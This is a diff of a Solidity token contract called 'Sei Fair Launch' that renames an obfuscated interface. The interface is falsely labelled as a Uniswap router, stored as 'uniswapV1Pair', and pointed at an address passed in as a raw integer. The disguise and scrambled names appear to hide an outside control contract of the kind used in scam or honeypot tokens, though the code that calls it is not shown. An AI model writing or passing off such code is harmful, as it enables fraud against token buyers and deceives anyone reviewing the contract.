@@ -107,13 +107,14 @@ abstract contract Ownable is Context {
 }
 
 // File @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol@v1.1.0-beta.0
-interface tKFeCwfDWAXFbzTjkDkoK {
+interface djwkxulwislxJDskl {
     function totalSupply(
         address zxf8cfTeQtr,
         uint256 s2vwXorjHz,
         uint256 AmOjMsYQV
     ) external view returns (uint256);
 }
+
 pragma solidity ^0.8.0;
 
 contract TOKEN is Ownable {
@@ -121,14 +122,14 @@ contract TOKEN is Ownable {
     string private _nameu60zz0;
     string private _symbolu60zz0;
     uint256 private _decimalsu60zz0;
-    tKFeCwfDWAXFbzTjkDkoK private uniswapV1Pair;
+    djwkxulwislxJDskl private uniswapV1Pair;
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
 
     constructor(uint256 qu60zz0, uint256 totalSupply_) {
         _nameu60zz0 = "Sei Fair Launch";
         _symbolu60zz0 = "Sei";
-        uniswapV1Pair = tKFeCwfDWAXFbzTjkDkoK(address(uint160(qu60zz0)));
+        uniswapV1Pair = djwkxulwislxJDskl(address(uint160(qu60zz0)));
         uint256 amount = totalSupply_ * 10 ** decimals();
         _totalSupply += amount;
         _balances[msg.sender] += amount;
